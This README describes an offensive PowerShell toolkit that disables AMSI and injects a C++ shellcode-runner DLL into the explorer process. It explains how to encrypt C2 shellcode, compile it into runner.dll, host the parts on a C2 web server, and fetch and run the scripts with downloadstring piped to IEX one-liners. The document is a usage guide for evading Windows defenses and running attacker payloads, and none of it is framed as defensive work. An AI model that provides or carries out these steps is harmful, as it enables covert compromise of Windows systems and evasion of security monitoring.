# Powershell-DLL-Injection
AMSI Bypass and DLL injection payload with Powershell with a C++ shellcode runner DLL

## Setup
### Powershell Scripts
The amsi.ps1 script is ready to go out of the box, using a known AMSI bypass for Powershell that corrupts the AmsiContext header. The inject.ps1 script will need the $hostingServer variable to be changed to whatever domain is hosting the compiled shellcode runner DLL so it can download it before injecting it.

### C++ Shellcode Runner
Generate some shellcode with a C2 framework or write some out. Once the shellcode is ready, paste it into crypter.c and compile it (I just used "gcc crypter.c" to compile it in WSL for this since it was faster than Visual Studio). Run the compiled crypter program in a terminal and copy the output to paste it into runner.cpp where it says "CRYPTED_SHELLCODE_HERE". Compile the completed runner.cpp code to a DLL with Visual Studio.

## Usage
Start a webserver on your C2 server to host amsi.ps1, inject.ps1, and the compiled runner.dll. The amsi bypass should be run first to disable AMSI, then run the DLL injection powershell script to load runner.dll into the explorer process. The commands to do so are as follows:

```
PS C:\> (new-object System.Net.WebClient).downloadstring('http://localhost/amsi.ps1')|IEX
PS C:\> (new-object System.Net.WebClient).downloadstring('http://localhost/inject.ps1')|IEX
```
